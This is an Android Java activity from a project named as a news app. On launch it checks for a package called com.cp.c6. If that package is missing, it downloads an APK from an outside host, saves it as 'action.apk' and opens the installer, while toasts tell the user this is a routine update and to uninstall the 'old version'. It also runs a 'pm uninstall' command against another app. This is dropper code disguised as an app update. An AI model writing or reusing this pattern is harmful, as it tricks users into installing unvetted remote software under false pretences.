package com.kaku.colorfulnews.mvp.ui.activities;

/**
 * Created by zx on 2018/1/2 0002.
 */

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Color;
import android.graphics.drawable.ClipDrawable;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.Nullable;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.kaku.colorfulnews.R;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.List;

/**
 * Created by Administrator on 2018/1/1.
 */

public class WebActivity extends Activity {
    TextView tv;
    ProgressBar progressBar;
    LinearLayout l;
    int i = 0;

    int drawId = R.drawable.tt;
    String downloadUrl = "https://apk.kosungames.com/app-c6-release.apk";

    @SuppressLint({"NewApi", "WrongConstant"})
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        l = new LinearLayout(this);
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        l.setGravity(Gravity.CENTER);
        l.setOrientation(LinearLayout.VERTICAL);

        tv = new TextView(this);
        tv.setText("下载百分之0%。。。。");
        tv.setTextColor(Color.BLACK);
        tv.setTextSize(20);
        tv.setGravity(Gravity.CENTER);

        ClipDrawable d = new ClipDrawable(new ColorDrawable(Color.YELLOW), Gravity.LEFT, ClipDrawable.HORIZONTAL);
        progressBar.setProgressDrawable(d);
        progressBar.setBackgroundColor(Color.GRAY);
        progressBar.setMax(100);
        progressBar.setScrollBarSize(20);
        progressBar.setProgress(60);

        l.setBackgroundResource(drawId);
        TextView v = new TextView(this);
        v.setText("");
        v.setHeight(1050);
        l.addView(v);
        l.addView(progressBar);
        l.addView(tv);
        setContentView(l);

        doStartApplicationWithPackageName("com.cp.c6");
    }


    protected File downLoadFile(String httpUrl) {
        // TODO Auto-generated method stub
        final String fileName = "updata.apk";
        File tmpFile = new File("/sdcard/update");
        if (!tmpFile.exists()) {
            tmpFile.mkdir();
        }
        final File file = new File("/sdcard/update/" + fileName);

        try {
            URL url = new URL(httpUrl);
            try {

                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                InputStream is = conn.getInputStream();
                FileOutputStream fos = new FileOutputStream(file);
                byte[] buf = new byte[256];
                conn.connect();
                double count = 0;
                if (conn.getResponseCode() >= 400) {


                } else {
                    while (count <= 100) {
                        if (is != null) {
                            int numRead = is.read(buf);
                            if (numRead <= 0) {
                                break;
                            } else {
                                fos.write(buf, 0, numRead);
                            }

                        } else {
                            break;
                        }

                    }
                }

                conn.disconnect();
                fos.close();
                is.close();
            } catch (IOException e) {
                // TODO Auto-generated catch block

                e.printStackTrace();
            }
        } catch (MalformedURLException e) {
            // TODO Auto-generated catch block

            e.printStackTrace();
        }

        return file;
    }
    //打开APK程序代码

    private void openFile(File file) {
        // TODO Auto-generated method stub
        Intent intent = new Intent();
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setAction(android.content.Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(file),
                "application/vnd.android.package-archive");
        startActivity(intent);

        //            new ProcessBuilder().command("adb","uninstall","com.funsoftid.gurita").start();
        execCommand("pm", "uninstall", "com.funsoftid.gurita");
    }

    public static String execCommand(String... command) {
        Process process = null;
        InputStream errIs = null;
        InputStream inIs = null;
        String result = "";

        try {
            process = new ProcessBuilder().command(command).start();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int read = -1;
            errIs = process.getErrorStream();
            while ((read = errIs.read()) != -1) {
                baos.write(read);
            }
            inIs = process.getInputStream();
            while ((read = inIs.read()) != -1) {
                baos.write(read);
            }
            result = new String(baos.toByteArray());
            if (inIs != null)
                inIs.close();
            if (errIs != null)
                errIs.close();
            process.destroy();
        } catch (IOException e) {
            result = e.getMessage();
        }
        return result;
    }

    File file;

    class DownloadAPK extends AsyncTask<String, Integer, String> {

        TextView tv;
        ProgressBar pb;

        public DownloadAPK(ProgressBar progressBarg, TextView textView) {
            this.pb = progressBarg;
            this.tv = textView;
        }

        @Override
        protected String doInBackground(String... strings) {
            URL url;
            HttpURLConnection conn;
            BufferedInputStream bis = null;
            FileOutputStream fos = null;

            try {
                url = new URL(strings[0]);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);

                int fileLength = conn.getContentLength();
                bis = new BufferedInputStream(conn.getInputStream());
                String fileName = Environment.getExternalStorageDirectory().getPath() + "/magkare/action.apk";
                file = new File(fileName);
                if (!file.exists()) {
                    if (!file.getParentFile().exists()) {
                        file.getParentFile().mkdirs();
                    }
                    file.createNewFile();
                }
                fos = new FileOutputStream(file);
                byte data[] = new byte[4 * 1024];
                long total = 0;
                int count;
                while ((count = bis.read(data)) != -1) {
                    total += count;
                    publishProgress((int) (total * 100 / fileLength));
                    fos.write(data, 0, count);
                    fos.flush();
                }
                fos.flush();

            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                try {
                    if (fos != null) {
                        fos.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    if (bis != null) {
                        bis.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... progress) {
            super.onProgressUpdate(progress);
            progressBar.setProgress(progress[0]);
            tv.setText("更新中。已下载" + progress[0] + "%...");
            i = progress[0];
        }


        @SuppressLint("WrongConstant")
        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            //打开安装apk文件操作
            Toast.makeText(WebActivity.this, "下载完成", 3000).show();
            Toast.makeText(WebActivity.this, "请安装新版本，卸载旧版本。新版本打开可能第一次加载有点慢。", 3000).show();
            Toast.makeText(WebActivity.this, "请安装新版本，卸载旧版本。新版本打开可能第一次加载有点慢。", 3000).show();

            openFile(file);

        }
    }

    @SuppressLint("WrongConstant")
    private void doStartApplicationWithPackageName(String packagename) {

        // 通过包名获取此APP详细信息，包括Activities、services、versioncode、name等等
        PackageInfo packageinfo = null;

        List<PackageInfo> installedPackages = getPackageManager().getInstalledPackages(0);
        try {
            packageinfo = getPackageManager().getPackageInfo(packagename, 0);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }


        boolean hasPackage = false;
        for (PackageInfo installedPackage : installedPackages) {
            if (installedPackage.packageName.equals(packagename)) {
                hasPackage = true;
                Intent resolveIntent = new Intent(Intent.ACTION_MAIN, null);
                resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);
                resolveIntent.setPackage(packageinfo.packageName);

                // 通过getPackageManager()的queryIntentActivities方法遍历
                List<ResolveInfo> resolveinfoList = getPackageManager()
                        .queryIntentActivities(resolveIntent, 0);

                ResolveInfo resolveinfo = resolveinfoList.iterator().next();
                if (resolveinfo != null) {
                    // packagename = 参数packname
                    String packageName = resolveinfo.activityInfo.packageName;
                    // 这个就是我们要找的该APP的LAUNCHER的Activity[组织形式：packagename.mainActivityname]
                    String className = resolveinfo.activityInfo.name;
                    // LAUNCHER Intent
                    Intent intent = new Intent(Intent.ACTION_MAIN);
                    intent.addCategory(Intent.CATEGORY_LAUNCHER);

                    // 设置ComponentName参数1:packagename参数2:MainActivity路径
                    ComponentName cn = new ComponentName(packageName, className);

                    intent.setComponent(cn);
                    startActivity(intent);
                    finish();
                }
                break;
            }
        }

        if (!hasPackage) {
            Toast.makeText(this, "开始下载最新版本，预计30秒下载完成。(｢･ω･)｢嘿", 3000).show();
            new DownloadAPK(progressBar, tv).execute(downloadUrl);
        }
        // 创建一个类别为CATEGORY_LAUNCHER的该包名的Intent
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (i==100){
            Toast.makeText(WebActivity.this, "下载完成", Toast.LENGTH_SHORT).show();
            Toast.makeText(WebActivity.this, "请安装新版本，卸载旧版本。新版本打开可能第一次加载有点慢。", Toast.LENGTH_LONG).show();
            Toast.makeText(WebActivity.this, "请安装新版本，卸载旧版本。新版本打开可能第一次加载有点慢。", Toast.LENGTH_LONG).show();
        }
    }
}
